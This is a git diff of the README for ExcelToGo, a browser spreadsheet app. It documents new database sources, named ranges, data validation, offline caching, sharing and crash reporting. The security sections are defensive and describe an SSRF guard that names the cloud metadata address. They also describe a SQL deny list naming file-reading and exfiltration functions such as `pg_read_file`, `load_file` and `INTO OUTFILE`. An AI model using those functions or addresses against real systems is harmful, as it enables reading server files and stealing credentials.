@@ -36,7 +36,7 @@ Runs in your browser; your data stays on your machine.
   <img alt="Tailwind CSS" src="https://img.shields.io/badge/Tailwind_CSS-4-06B6D4?logo=tailwindcss&logoColor=white">
   <img alt="Zustand" src="https://img.shields.io/badge/Zustand-5-443E38">
   <a href="https://excel-to-go.vercel.app"><img alt="Live demo" src="https://img.shields.io/badge/▶_try_it-live_demo-2F9E44"></a>
-  <img alt="Vitest" src="https://img.shields.io/badge/tests-1058%20passing-2F9E44?logo=vitest&logoColor=white">
+  <img alt="Vitest" src="https://img.shields.io/badge/tests-1305%20passing-2F9E44?logo=vitest&logoColor=white">
   <img alt="CI" src="https://github.com/SuruchBoss/ExcelToGo/actions/workflows/ci.yml/badge.svg">
 </p>
 
@@ -49,11 +49,14 @@ Beyond the assistant, a Next.js web app that turns an Excel-style grid into a fr
 of memorizing syntax, an AI assistant that suggests formulas from a natural-language question (Thai or English),
 and a hand-written formula engine (tokenizer → parser → evaluator, no third-party formula library) supporting
 cell/range references, relative & structural reference adjustment, circular-reference detection, multi-sheet
-workbooks, conditional formatting that re-colours cells from their current values, pivot summaries over a
-selected range, and full-fidelity Excel/PDF export — where a chart exported to `.xlsx` is a real, editable chart
+workbooks, named ranges (in Thai, substituted at compile time so the dependency graph stays honest), rules on
+what a cell will accept that refuse a value rather than flag it afterwards, conditional formatting that
+re-colours cells from their current values, pivot summaries over a selected range, live data from a REST/CSV
+endpoint or straight from PostgreSQL/MySQL — one saved read-only query, and nobody downstream ever sees SQL —
+and full-fidelity Excel/PDF export, where a chart exported to `.xlsx` is a real, editable chart
 bound to its cells, because the OOXML chart parts are written by hand (ExcelJS writes none). Plus optional
 bring-your-own-backend cloud save and live co-editing over it — presence, last-writer-wins with the loser told, and
-an undo that does not erase the other person's work. Bilingual UI (Thai/English), 1058 automated tests.
+an undo that does not erase the other person's work. Bilingual UI (Thai/English), 1305 automated tests.
 
 ---
 
@@ -97,7 +100,7 @@ Want the harder parts: [embedding a Thai font in the PDF, with stacked tone mark
 
 ---
 
-### 🧪 What 1058 passing tests could not catch
+### 🧪 What 1305 passing tests could not catch
 
 Every test of the assistant **mocks the model** — it returns what I imagined it would. Put a real
 API key behind it, ask fourteen ordinary questions, and **six answers used functions this engine
@@ -108,7 +111,7 @@ Then **the first fix made it worse.** The rule started as "give the closest form
 allows", so _"join all the names into one line"_ came back as `=SUM(A2:A20)` — `0` in the cell, no
 error, nothing to notice. **A visible `#NAME?` traded for an invisible wrong number.**
 
-**And it happened again, in a different place.** With every gate green — 1058 tests, `axe` clean on
+**And it happened again, in a different place.** With every gate green — 1305 tests, `axe` clean on
 both pages at two widths — an hour of clicking through the public build the way a first-time visitor
 would found three things no gate can see:
 
@@ -148,13 +151,17 @@ tests say, and nothing whatever about whether that is the right thing.
   - [Charts from the sheet](#-charts-from-the-sheet)
   - [Conditional formatting](#-conditional-formatting)
   - [Cell comments](#-cell-comments)
+  - [Data validation](#-data-validation)
+  - [Named ranges](#-named-ranges)
   - [Cloud save (bring your own backend)](#️-cloud-save-bring-your-own-backend)
   - [Editing together](#-editing-together)
   - [The Excel keyboard](#️-the-excel-keyboard)
   - [Formulas that answer with a whole table (array formulas)](#-formulas-that-answer-with-a-whole-table-array-formulas)
   - [Formulas across sheets](#-formulas-across-sheets)
+  - [See what a formula is about](#-see-what-a-formula-is-about)
   - [The fill handle](#️-the-fill-handle)
   - [Find and replace](#-find-and-replace)
+  - [Opens with the network off](#-opens-with-the-network-off)
   - [Works on a phone](#-works-on-a-phone)
   - [Insert/delete rows & columns](#-insertdelete-rows--columns)
   - [Merging cells](#-merging-cells)
@@ -249,12 +256,17 @@ Other available commands:
 | `npm run build` | Build a production bundle |
 | `npm run start` | Run the production build (run `npm run build` first) |
 | `npm run lint` | Check code quality with ESLint |
-| `npm test` | Run the 1058-case Vitest suite |
+| `npm test` | Run the 1305-case Vitest suite |
 | `npm run check:readme` | Check the READMEs still match the code (links/images/test count/new modules/both languages) |
+| `npm run check:screens` | Figures printed on a screenshot still match the source |
+| `npm run check:rls` | Two real accounts against your own Supabase: does the database refuse what the policies say it should (needs env) |
+| `npm run check:deps` | Every advisory is fixed, or written down with a reason and a review date |
+| `npm run check:bundle` | Size budgets, and the cloud client staying in a chunk of its own (needs a build) |
+| `npm run check:mutants` | Breaks the engine on purpose and checks the suite notices — 31/32 (no build needed) |
 | `npm run check:a11y` | axe on both pages at 390px and 1280px, plus sideways-scroll checks (needs a build) |
-| `npm run check:e2e` | Drives the real app through 8 flows: formulas, `.xlsx` round trip, keyboard only, undo, announcements, the AI assistant, the CSP (needs a build) |
+| `npm run check:e2e` | Drives the real app through 10 flows: formulas, `.xlsx` round trip, keyboard only, undo, announcements, the AI assistant, the CSP (needs a build) |
 | `npm run check:ai` | Asks the real Claude with your own key and checks the formulas against what this engine can evaluate — not in `verify`, because it needs a key and costs money |
-| `npm run verify` | Everything, before a push: lint → check:readme → test → build → check:a11y → check:e2e |
+| `npm run verify` | Everything, before a push: lint → check:readme → check:screens → check:deps → test → check:mutants → build → check:bundle → check:a11y → check:e2e |
 | `npm run build:social` | Re-render `public/social-preview.png` (1280×640), counting the card's figures from source |
 
 ### Step 2 — Connect the AI assistant to real Claude (optional)
@@ -464,7 +476,8 @@ Three guards:
 |---|---|
 | **A token is required** | Unset means off, not open (403) · compared in constant time · held in `sessionStorage`, so closing the browser asks again |
 | **It cannot reach your private network** | **Every address DNS returns** is checked, and re-checked after **every redirect** — loopback, RFC 1918, `169.254.169.254` (metadata on AWS/GCP/Azure), IPv6 link-local and unique-local, and IPv4 embedded in IPv6 in **every spelling** |
-| **Credentials are encrypted at rest** | AES-256-GCM under `SOURCES_SECRET_KEY` · with no key it refuses to store a credential rather than writing one in the clear |
+| **Credentials are encrypted at rest** | AES-256-GCM under `SOURCES_SECRET_KEY` · with no key it refuses to store a credential rather than writing one in the clear · a database connection string counts as one |
+| **A database query cannot write** | Every query runs in a read-only transaction, so the database itself refuses a write, and `sqlGuard` refuses again at save time · a database on a private address needs its host in `SOURCES_ALLOWED_DB_HOSTS` |
 
 The easy one to get wrong, found by testing rather than reasoning: `new URL("http://[::ffff:169.254.169.254]/")`
 rewrites the host as `::ffff:a9fe:a9fe`, so a filter that only knew the dotted form waves the
@@ -545,7 +558,58 @@ Behind the scenes:
   every 5s), `/api/demo/summary` (a KPI-style object), and `/api/demo/orders` (**paginated**, 25 rows a page
   over 120 rows, for exercising the pagination path).
 
-> Database sources (Postgres/MySQL) are the next phase — the option is visible in the form but disabled for now.
+### 🗄 Straight into a database (PostgreSQL / MySQL)
+
+Identical to a REST source in every way that reaches a user. What the technical person fills in is
+different: instead of a URL, a **connection string and one SQL statement**. Everyone else sees the
+resulting table exactly as they see any other source — **they never see the SQL**, which is the
+whole reason this feature was split into two roles in the first place.
+
+```
+postgres://user:pass@db.example.com:5432/shop
+select region, sum(total) as revenue from orders group by region
+```
+
+**The query is guarded twice, and only one of the two is a guarantee.**
+
+- **The guarantee:** every query runs inside a **read-only transaction** (`begin read only` /
+  `set session transaction read only`), so a write is refused by the database itself whatever the
+  text said. MySQL connections open with `multipleStatements: false`, so one string cannot carry a
+  second statement.
+- **The early warning:** `sqlGuard.ts` refuses, at save time, anything that is not a single
+  `SELECT`/`WITH` — a second statement, a write keyword, `SELECT … INTO OUTFILE`, `pg_read_file`,
+  `load_file`, `pg_sleep`. It scans the statement with comments, strings, quoted identifiers and
+  Postgres dollar-quoting **blanked out** rather than removed, so nothing left over can be spliced
+  together, and an unterminated comment or quote is a refusal rather than a guess about where it
+  ended.
+
+A keyword list can always be walked around; a read-only transaction cannot. Both are here because
+the first gives a clear error while somebody is still looking at the form and the second gives a
+correct outcome at three in the morning. Those are not the same job.
+
+**A connection string is a credential**, so it is encrypted at rest like an auth header, and the
+browser never sees the string — only a description of it
+(`postgres://••••••••@db.example.com/shop`), with no user and no password in it.
+
+**One network rule is deliberately looser than the REST side.** A database on a private address is
+the *normal* case — an RDS instance inside a VPC, a container beside the app — and applying the
+REST rule would make the feature useless in exactly the deployments it exists for. So the
+private-address rule still stands by default and `SOURCES_ALLOWED_DB_HOSTS` is the way past it: a
+list only the operator can write, that nothing a browser sends can add to, and where a near miss
+(`evil.db.internal` against an allowed `db.internal`) is not a match. A string naming a **unix
+socket** is refused in both spellings — as a path host, and as the `?host=` parameter the Postgres
+driver prefers over the host in the URL — because a socket steps around every address check by not
+using an address.
+
+**Stated limits:** the database account's permissions are yours to scope. This app cannot stop a
+query reading a table you would rather it did not; the right answer is a read-only role that sees
+only what the source is meant to publish. TLS happens only if the string asks for it
+(`sslmode=require`, `?ssl=true`), and `sslmode=disable` is honoured as written, because a
+connection that merely *looks* encrypted is worse than one that admits it is not. There is no
+table picker yet (the SQL is typed), and **no test connects to a real database** — so the code that
+touches a driver is kept as thin as it can be, and every judgement call lives in pure modules that
+are tested without one.
+
 
 ### 📐 Spreadsheet grid
 
@@ -588,6 +652,27 @@ layout. The second is rendered as its own document, **which means the app's styl
 so it is styled inline in a system font. A fallback that still depends on a stylesheet loading is one
 more thing that can fail at the moment everything else already has. The behaviour is shared through one
 hook, so the two screens may look different but cannot act differently.
+
+**And now the operator hears about it — if they asked to.** The crash screen got the user's work
+back out and told nobody else, so a bug that only fires on one imported file could run for months
+unnoticed. Set `NEXT_PUBLIC_ERROR_REPORT_URL` to your own collector and both boundaries post a
+report to it; leave it unset — the default, and what the public demo does — and nothing is sent,
+because there is no default endpoint to forget to unset.
+
+This is in tension with the one thing the app promises, so what a report may contain is a fixed
+list rather than "the error object": a message, Next's digest, a trimmed stack, the **path without
+its query string**, the browser's user-agent, and a timestamp. Message and stack are capped, so one
+report cannot become a data channel.
+
+And the stack is **scrubbed** before it leaves, because a thrown error carries whatever was in
+scope: an Anthropic key the visitor pasted, a Supabase token, an email address — and any run of
+Thai, which in a stack from this app is a cell, a sheet name or a file name rather than anything
+about the code. An ordinary English stack comes through untouched, which is checked too: a redactor
+that eats the trace reports nothing useful.
+
+The report endpoint's origin joins `connect-src` automatically. A collector that is configured but
+not in the policy would be blocked silently, which is worse than having none — the operator would
+believe they had one.
 
 ### ✂️ Copy / Cut / Paste
 
@@ -691,9 +776,13 @@ NEXT_PUBLIC_SUPABASE_ANON_KEY=...
 
 ![Cloud save](public/screenshots/23-cloud-save.png)
 
-Run [`supabase/migrations/0001_workbooks.sql`](supabase/migrations/0001_workbooks.sql) against your
-project once first — it creates the table and the **row-level security** policies that keep one
-account's workbooks away from another's.
+Run both migrations against your project once first —
+[`0001_workbooks.sql`](supabase/migrations/0001_workbooks.sql) creates the table and the
+**row-level security** policies that keep one account's workbooks away from another's, and
+[`0002_sharing_and_realtime.sql`](supabase/migrations/0002_sharing_and_realtime.sql) adds sharing
+and authorises the live channel, and
+[`0003_versions.sql`](supabase/migrations/0003_versions.sql) keeps the last twenty versions of each
+workbook.
 
 - **The browser talks to your Supabase directly**, never through this app's server, so whoever
   deploys it never sees their users' spreadsheets.
@@ -707,14 +796,28 @@ account's workbooks away from another's.
 cloud code is unreachable, and the ~250KB Supabase client **is never downloaded**. That was checked
 by counting the chunks the browser actually requests, not assumed.
 
-**Not supported:** automatic sync (you press save), version history, or sharing a workbook with
-someone else.
+**Sharing works now** — the owner adds an email, and whoever signs in with that address on the same
+Supabase project can open and edit the workbook. There is no read-only role, and saying so is better
+than implying one: a read-only share the app cannot enforce in the grid would be a promise made in
+the database and broken in the browser.
+
+**Version history works now** — every save over a workbook keeps the copy it replaced, the last
+twenty per workbook. The panel says *open*, not restore: looking at a version and deciding is a
+different act from replacing today's work with it, and one button doing both would be the more
+dangerous one wearing the safer one's label. Saving afterwards is an ordinary save, which snapshots
+what was there first — so even taking an old version is undoable.
+
+Rows appear there only through a database trigger. There is no insert policy, deliberately: a client
+that could write to that table could forge a history, and a history that can be forged is not one.
+Renaming a workbook does not make a version, or a rename would push a real one out of the window.
+
+**Not supported:** automatic sync (you press save).
 
 ### 👥 Editing together
 
-Save a workbook to your Supabase project, press **"Join the live session"** in the cloud panel, and
-everyone who opens that workbook from the same project sees each other type, with a coloured dot
-for where each person's cursor is.
+Save a workbook to your Supabase project, share it with someone, press **"Join the live session"**
+in the cloud panel, and everyone who can open that workbook sees the others type, with a coloured
+dot for where each person's cursor is.
 
 It rides on **Supabase Realtime broadcast** rather than Postgres changes: a keystroke is not worth a
 row. Messages travel between the browsers that are connected right now and are never stored, so your
@@ -745,9 +848,22 @@ database still holds saved workbooks and nothing else.
   attached, so it cannot be captured from a deployment without a backend, and a mocked-up image
   would be a claim rather than evidence.
 
-Everything arriving on the channel **is checked before it is used**, not trusted: anyone holding the
-anon key can join. A `row` of `-1` reaches an array index, and a `raw` that is not a string reaches
-the formula engine.
+**The channel is authorised, not merely obscure.** This was got wrong first. A Supabase Realtime
+topic is public unless the client marks it private and the database says who may join, and the first
+version of this feature did not: row-level security protected the *saved* workbook while every
+keystroke travelled on a topic anyone holding the anon key could subscribe to — and the anon key is
+in the JavaScript, for everyone. The workbook id is a uuid, so it was hard to exploit, which is
+exactly the kind of thing that stays wrong for years. The topic is now private and
+[`0002_sharing_and_realtime.sql`](supabase/migrations/0002_sharing_and_realtime.sql) decides who may
+listen and who may speak, from the same membership that decides who may open the workbook at all.
+
+The topic's name is what the policy reads to find the workbook, so a test reads the SQL and pins the
+two together — neither language can see the other, and a drift would look like "live editing stopped
+working" rather than like a format change.
+
+Everything arriving on the channel **is still checked before it is used**, because authorisation
+says who may speak, not that what they said is well formed. A `row` of `-1` reaches an array index,
+and a `raw` that is not a string reaches the formula engine.
 
 ### 💬 Cell comments
 
@@ -776,6 +892,82 @@ text rather than as a plain string.
 Google Sheets; and **a note on an empty cell is lost when the file is read back in** — the file
 itself is correct and Excel shows the note, but ExcelJS attaches notes only to cells present in its
 sheet model, and a cell with no value isn't. The loss is in the reader, not the writer.
+
+### 🛡 Data validation
+
+Select a range, hit **Limit** in the format bar, and say what those cells will accept: one of a
+list, a number in a range, or a length cap. A cell carrying a rule gets a **thin emerald ring**,
+and a list rule turns it into a dropdown while you type.
+
+**Typing something outside the rule is refused rather than saved and flagged.** A warning on a cell
+that *already holds* the wrong thing is a note about a mistake; refusing the write is the mistake
+not happening. The refusal is **announced to screen readers**, because a keystroke that does
+nothing and says nothing is indistinguishable from a broken keyboard.
+
+The reason it exists: a shared sheet always ends up with `เหนือ`, `ภาคเหนือ`, `north` and ` เหนือ`
+in one column, and then a `SUMIF` quietly counts one of them.
+
+**An empty value always passes** — clearing a cell is not entering a wrong one, and a rule that
+refuses deletion turns a typo into something you cannot undo by hand. **A formula always passes**
+too, because there is no result to check yet; refusing it would mean a validated column could hold
+no formulas at all, which costs more than the rule is worth.
+
+Rules **move with inserted and deleted rows**, the way comments do, and go **into and out of
+`.xlsx` as real data validation** (`list`, `decimal`, `textLength`) — a file that arrived from
+Excel with a dropdown on it still refuses the wrong value here.
+
+**Stated limits:** no "date between" and no custom-formula rule yet. **A list whose options contain
+a comma, or one longer than 255 characters, is not written to the file**: Excel's inline form has
+no escape for a comma, and its answer is to point at a range of cells elsewhere in the workbook,
+which would mean this app inventing a hidden sheet inside somebody's file. Dropping the dropdown
+beats writing it truncated. And a **template's** own rules are still a separate thing from the
+person's — deliberately, since "unlock this template" ought to release the template's rules too.
+
+### 🏷 Named ranges
+
+`=SUMIF(Sales,">1000")` against `=SUMIF(B2:B500,">1000")`: the second makes every reader go and look
+at what is in column B, and gives the ones who guess wrong no way to find out. The formula bar is
+where a spreadsheet explains itself, and an address explains nothing.
+
+![Naming a range, and limiting what a cell will accept](public/screenshots/43-sheet-rules.png)
+
+<sub>One frame, both halves: the formula bar reads `=SUM(ยอดขาย)` · the cells that name stands for are lit as
+its precedents, because the engine has already substituted it · and the thin emerald rings down column A are
+the cells carrying a rule about what may go in them.</sub>
+
+Select a range, hit **Names** in the format bar, type a name, and use it. **Thai names work**, which
+is the whole reason the feature is here: Thai characters used to fall into the tokenizer's
+"unknown character, skip it" branch one at a time, so `=SUM(ยอดขาย)` was read as `SUM()` and
+answered zero in silence.
+
+A name that cannot be used says why, next to the box: one that is **also a cell address** (`B2`)
+would leave a formula unable to tell them apart; one with **a space or a character the tokenizer
+cannot read** would exist and be unusable; function names and reserved words (`SUM`, `TRUE`, `R`,
+`C`); and duplicates, case-insensitively.
+
+**Names are substituted at compile time, not at evaluation time** — that is what keeps the
+dependency graph honest, since precedents are read off the syntax tree and the tree therefore has
+to hold the real rectangle before anything looks at it. The formula cache is keyed by the name
+table's fingerprint as well as the text, so redefining a name recompiles the formulas that read it
+instead of serving the tree built around the old rectangle. Tests that deliberately break both of
+those are what say it works.
+
+**Names follow inserted and deleted rows**, through the same rewriter the formulas use, and **do
+not shift when filled** — as in Excel. Both fall out of `shiftFormulaRefs` only ever rewriting cell
+and range tokens.
+
+They go **into and out of `.xlsx` as real defined names**, so a workbook that arrived from Excel
+with names on it still computes.
+
+**Stated limits:** **a name belongs to the sheet that defines it, not to the workbook.** Excel has
+both kinds; this has the second. The reason is mechanical rather than principled —
+`computeSheet(sheet)` takes a sheet, and fifteen call sites pass one with no workbook in reach. A
+name whose *target* points at another tab still works, which covers the lookup-table case. On
+export, **two tabs claiming the same name collide and the first one wins**, because a file's
+defined names are workbook-wide and renaming the second would produce a file whose formulas point
+somewhere nobody asked for. And **deleting a name leaves the formulas holding it**, reading
+`#NAME?` rather than being rewritten back to addresses: quietly rewriting work nobody asked to have
+rewritten is worse, and `#NAME?` is both findable and undoable.
 
 ### 🌡 Conditional formatting
 
@@ -822,6 +1014,9 @@ mock-up.
 | `End` / `Ctrl+End` | Last filled cell in the row / the corner of everything used |
 | `PageUp` / `PageDown` | A screen at a time, **measured in pixels rather than a row count**, because an imported file's rows are not all the same height |
 | `Ctrl+A` | The table you are standing in; press again for the whole sheet, the way Excel does |
+| `Ctrl+Space` / `Shift+Space` | The whole column / the whole row the selection touches; both together, the sheet |
+| **Freeze panes** (format bar) | Everything above and left of the cursor stays put while the rest scrolls. The split lives on the sheet, so it survives a reload, goes into undo, follows a row inserted above it, and travels in the `.xlsx` both ways |
+| `Ctrl+Enter` | Put the cell the cursor is on into everything selected, in one undo step — references shift as they would in a drag-fill, because a formula that kept pointing at the anchor's row would fill a column with the same wrong number |
 | `Tab` / `Shift+Tab` · `Enter` / `Shift+Enter` | Right/left · down/up |
 | `F2` · `Delete` · `Escape` | Edit in place · clear the selection · cancel |
 
@@ -892,13 +1087,30 @@ the sheet, and the formula is `#SPILL!` and **nothing at all is written**. Half 
 sheet would be worse than none, because those values would look like data. Type over a spilled cell
 and the formula becomes `#SPILL!` at once, the way Excel does it.
 
-> **Not supported yet:** a sheet holding array formulas recomputes in full on every edit instead of
-> incrementally (`computeSheet` refuses the incremental path once it sees a spill). An array writes
-> into cells *outside* the set marked dirty, and deleting one has to clear them again; tracking that
-> properly means putting spill regions into the dependency graph, which is more than the feature has
-> earned yet — and a half-erased array left on screen is a worse bug than a slower recompute. In an
-> exported `.xlsx` the formula is written at the anchor, so a version of Excel that knows dynamic
-> arrays spills it again and an older one shows a single value.
+**It no longer costs the whole sheet.** This section used to carry a warning that any sheet holding
+an array recomputed in full on every keystroke, because an array writes into cells *outside* the set
+marked dirty and a deleted one has to clear them again. The bail-out was honest and expensive: one
+`SEQUENCE` in a corner made every edit anywhere a full pass.
+
+Spill regions are now part of the closure, walked in both directions. Typing into a spilled cell
+marks its anchor dirty, because the array's landing ground is no longer clear; an anchor going dirty
+marks every cell it filled, because the array may come back shorter. The map is carried between
+passes and emptied only where an array is about to run again, so a shrinking array leaves nothing
+behind. One keystroke on a sheet that also holds an array, median of nine, same machine:
+
+| formula rows | before | after |
+|---|---|---|
+| 200 | 3.07 ms | 0.85 ms |
+| 1,000 | 8.72 ms | 2.34 ms |
+| 3,000 | 26.42 ms | 2.25 ms |
+
+The last row is the point: the cost stopped following the size of the sheet. Ten tests check that
+the incremental answer is identical to a cold recompute — including a run of seven consecutive
+edits, because each pass builds on the last one's snapshot and an error there compounds instead of
+showing up once.
+
+> In an exported `.xlsx` the formula is written at the anchor, so a version of Excel that knows
+> dynamic arrays spills it again and an older one shows a single value.
 
 ### 🔗 Formulas across sheets
 
@@ -936,6 +1148,36 @@ Renaming a tab rewrites the formulas that named it, quoting or unquoting as the 
 Inserting a row in one sheet moves `Sheet2!A5` everywhere and leaves every bare `A5` alone, because
 those name the sheet they are written on. A sheet that does not exist is `#REF!`, and comes back to
 life if someone creates one by that name.
+
+### 🔍 See what a formula is about
+
+Select a cell holding a formula and the cells it reads are outlined on the grid, with the ranges
+written out beside the formula bar.
+
+![What a formula reads](public/screenshots/41-precedents.png)
+
+This exists for one specific bug, and it is the most expensive one in this project's history:
+`C2:C4` and `C2:D4` differ by one character, both compute, neither errors, and the wrong total is
+noticed a week later by somebody else. The range picker stops that when a formula is *written*.
+Nothing stopped it when a formula is *read* — you had to hold the addresses in your head and
+compare them against the sheet.
+
+The dependency graph already worked this out; it is how one edit recomputes three cells instead of
+nine thousand. What was missing was showing the person the same answer.
+
+- **The ranges are written out in words as well as shaded.** A coloured ring tells a sighted person
+  which cells a formula is about and tells a screen reader nothing — and `C2:C4` and `C2:D4` turn
+  out to be easier to tell apart read out than shaded in.
+- **A reference to another sheet is dropped rather than drawn here.** The engine flattens
+  `Sheet2!A1` into the same key as a local `A1`, because it only needs to know *that* a formula is
+  stale. Colouring A1 on this sheet for it would be a lie told confidently; the label says another
+  sheet is involved instead.
+- **A range too large to mean anything is refused.** `=SUM(A:A)` reads a million cells, and
+  outlining a million cells is the screen turning one colour. The size is counted *before* the set
+  is built, so a whole-column reference does not allocate a million entries on the way to being
+  declined.
+- **Not shown while the editor is open**, where the text changes on every keystroke and the range
+  picker is already doing this job better.
 
 ### 🖱️ The fill handle
 
@@ -984,8 +1226,8 @@ It searches the **raw text, not the displayed result**, and the panel says so ra
 you to find out. That is the decision everything else follows from: what you are looking for in a
 spreadsheet is usually what you typed, and what you mean to replace is always what you typed —
 rewriting a formula's result would mean writing a number over the formula that produced it. So
-`=SUM(B1:B9)` is found by searching `SUM`. The cost, stated in the panel, is that searching `1250`
-does not find a cell showing `1,250` that a formula produced.
+`=SUM(B1:B9)` is found by searching `SUM`. The cost, stated in the panel, is that searching `4500`
+does not find a cell showing `4,500` that a formula produced.
 
 Match case, whole cell, and all sheets. `Enter` and `Shift+Enter` step forwards and back, wrapping,
 and Find Next walks the sheet in reading order rather than nearest-first — pressing it ten times
@@ -996,6 +1238,39 @@ button press means pressing Ctrl+Z a hundred times to find out what it did.
 It deliberately preempts the browser's own find bar, which searches the DOM — and the DOM holds the
 forty rows the grid has decided to render, so on a five-thousand-row sheet it would report "not
 found" for text that is plainly there.
+
+### 📴 Opens with the network off
+
+The pitch has always been that the spreadsheet lives in your browser and is never uploaded. That
+was true, and the app still could not open on a train — the document was local and the *program*
+was not. A fair thing for someone to hold against it.
+
+A service worker now caches the app itself, and a manifest lets it go on a home screen. Install it
+and `/app` opens with no network at all: the grid, the engine, the 64 functions, import and export,
+and whatever was autosaved in `localStorage`.
+
+**What the caching policy is, and why each part of it:**
+
+| | Policy | Because |
+|---|---|---|
+| Navigations (`/app`, `/`) | Network first, cache as fallback | A stale HTML document carries the CSP nonce and the script URLs of a build that may no longer exist. Offline it is served whole — response and headers together — so its nonce still matches its own inline scripts |
+| `/_next/static/*` | Cache first | Content-addressed: a given URL never changes what it holds, so a hit is always correct and a miss is a new build |
+| `/api/*`, the assistant, live data, Supabase | **Never cached** | These are the parts that *need* the network. A cached answer from them is a stale number presented as a current one, which is this project's least acceptable failure |
+
+**What still needs a connection**, since an app that quietly does less offline is worse than one
+that says so: the AI assistant, live data blocks (the cell keeps its last value and says when it
+was fetched), cloud save, and live editing.
+
+The worker is about a hundred lines, hand-written, and in the repository where you can read it —
+[`public/sw.js`](public/sw.js). A generated one would be a few hundred lines nobody here could
+answer questions about, and the caching policy is the only interesting decision in it.
+
+It does not register in development, which is deliberate: a worker caching the app shell is exactly
+what makes a code change appear not to have happened, and that costs an afternoon the first time.
+
+No screenshot: the install prompt is the browser's own chrome and looks different in every one of
+them. The e2e gate covers it instead — it registers the worker, switches the network off, reloads,
+and checks the grid is there rather than an error page.
 
 ### 📱 Works on a phone
 
@@ -1193,6 +1468,25 @@ references with `$` stay put).
   > want, the narrowed forms after ญ and ฐ. One rule that fixes what was actually unreadable beats
   > half a shaping engine.
 
+**Printed, it now reads like a report rather than a pile.** The export used to produce *a*
+document: portrait unless there were more than eight columns, eight-point type whatever the width,
+the column letters as the only heading, and no page numbers — so a twelve-page export was twelve
+loose sheets with nothing on them to say which came first.
+
+- **Type is sized from the sheet's width**, measured against A4's usable 182mm portrait and 269mm
+  landscape rather than guessed. A twenty-column sheet at 8pt runs off the page; a four-column one
+  at 5pt is unreadable for no reason. It stops shrinking at 5pt, because past that the page says
+  nothing whatever the size and going smaller only makes the document look like it is hiding
+  something.
+- **The rows you froze are repeated at the top of every page.** Somebody who froze two rows has
+  already answered "which rows are the heading"; asking again in a dialog would be asking twice.
+  Capped at three — a heading that fills a quarter of every page is not a heading.
+- **Page numbers**, in the language the app is in.
+
+**There is no page-setup dialog**, and that is a stopping point rather than an oversight: the
+defaults are right often enough that the dialog would mostly be a thing to click through. Margins,
+a chosen scale and a print range are the parts a dialog would add, and they are not here.
+
 ### 🔀 CSV in and out
 
 CSV is the format every other tool speaks — a bank statement, a POS export, the file a colleague mails you.
@@ -1371,7 +1665,7 @@ architecture behind it.
 | `@anthropic-ai/sdk` | Connects to the Claude API for the AI assistant |
 | `lucide-react` | UI icons |
 | `clsx` | Conditional className composition |
-| `vitest` | Unit tests for the formula engine, sort logic, JSON-to-table conversion, pagination, rate limiting, templates, file fidelity, conditional formatting and live blocks (1058 cases) |
+| `vitest` | Unit tests for the formula engine, sort logic, JSON-to-table conversion, pagination, rate limiting, templates, file fidelity, conditional formatting and live blocks (1305 cases) |
 
 > **Note:** No off-the-shelf formula library (e.g. HyperFormula) is used — the **formula engine is hand-written**
 > (tokenizer, parser, evaluator, and functions) to keep full control over its behavior. See
@@ -1521,6 +1815,8 @@ formulaEngine/ (tokenizer → parser → evaluator → functions)
 
 ```
 src/
+  app/manifest.ts            # The web app manifest, so it can go on a home screen
+  proxy.ts                   # Mints a CSP nonce per request — the reason script-src has no 'unsafe-inline'
   app/
     page.tsx                 # The landing page at / — features, screenshots, and the button into the app
     app/page.tsx             # The app itself at /app — assembles components from store state (holds none)
@@ -1612,6 +1908,12 @@ src/
     sheetCodec.ts            # Between the in-memory model (a full grid) and what goes into localStorage
                               # (only the cells holding something) — the old ceiling came from the
                               # sheet's size rather than its contents. Reads the old shape too (tested)
+    pageSetup.ts             # How a sheet lands on paper: orientation, type size, rows repeated per page (tested)
+    precedents.ts            # Which cells a formula reads, for drawing — cross-sheet refs dropped, huge ranges refused (tested)
+    sheetFreeze.ts           # Rows and columns that stay put while the rest scrolls, and follow row edits (tested)
+    dataValidation.ts        # What a cell will accept, refused before it is written, and the .xlsx mapping (tested)
+    namedRanges.ts           # Names for ranges: what may be one, substituted at compile time, moved by row edits (tested)
+    errorReport.ts           # Crash reports for the operator (off unless a URL is set) — keys, tokens, emails and Thai text scrubbed first (tested)
     crashRescue.ts           # Rescues the sheet out of localStorage when a render throws and offers it
                               # as one CSV per tab — touches no store, model or engine, since any of
                               # those may be what broke (tested)
@@ -1638,6 +1940,10 @@ src/
     dataSources/sourcesToken.ts  # The operator token on the browser side (kept in sessionStorage)
     server/rateLimiter.ts    # Per-IP ceiling on /api/ai/formula (in-memory fixed window) (tested)
     server/urlGuard.ts       # SSRF guard: checks resolved addresses and every redirect (tested)
+    server/dbGuard.ts        # Reads a connection string and refuses a private one unless the operator allowed it (tested)
+    server/executeDbSource.ts # Connects, runs the saved statement in a read-only transaction, returns a table (tested)
+    dataSources/sqlGuard.ts  # A saved query must be one SELECT — sees through comments, strings, dollar-quoting (tested)
+    dataSources/dbRows.ts    # Driver rows → table: big integers stay text, dates go ISO, binary never lands in a cell (tested)
     server/sourcesAuth.ts    # The gate on the live-data API — no token means off (tested)
     server/secretBox.ts      # Encrypts a source's credential with AES-256-GCM (tested)
     cloud/config.ts          # Whether a cloud backend is attached at all (off unless set) (tested)
@@ -1664,10 +1970,15 @@ src/
   types/
     sheet-ui.ts               # Types for the grid's selection state
 .github/workflows/
-  ci.yml                     # CI: lint → check:readme → test → build on every push/PR, Node 20.19/22.12/24
+  ci.yml                     # CI: lint → check:readme → test → check:mutants → build on every push/PR, Node 20.19/22.12/24
                              #     plus an accessibility job: axe at two widths in a real browser
 scripts/
   check-readme.mjs           # Pre-push README check (dependency-free) — see AGENTS.md for the rule
+  check-screenshots.mjs      # Figures printed on a screenshot vs. the source (a new image needs an entry)
+  check-rls.mjs              # Two real accounts on a real project: does the database refuse what it should
+  check-deps.mjs             # Every advisory accounted for, with a reason and an expiry date
+  check-bundle.mjs           # Size budgets, and the cloud client staying in a chunk of its own
+  check-mutants.mjs          # Breaks the engine a character at a time and asks if the suite notices
   check-a11y.mjs             # axe at two widths plus sideways-scroll checks, against a production build
   make-social-preview.mjs    # Renders GitHub's 1280x640 card, counting its figures from source
 public/
@@ -1839,8 +2150,11 @@ real errors along with the miss:
 
 The nearest-match modes compare rather than assume the column is sorted, which is the case
 `VLOOKUP`'s approximate match gets silently wrong. Both arrays must be a single row or column of the
-same length: Excel would spill a whole row out of a two-dimensional return array, and this engine
-has no spilling, so that is refused rather than answered with the first cell.
+same length: Excel would spill a whole row out of a two-dimensional return array, and `XLOOKUP` here
+does not, so that is refused rather than answered with the first cell.
+(This line used to read "this engine has no spilling", which was true when it was written and stayed
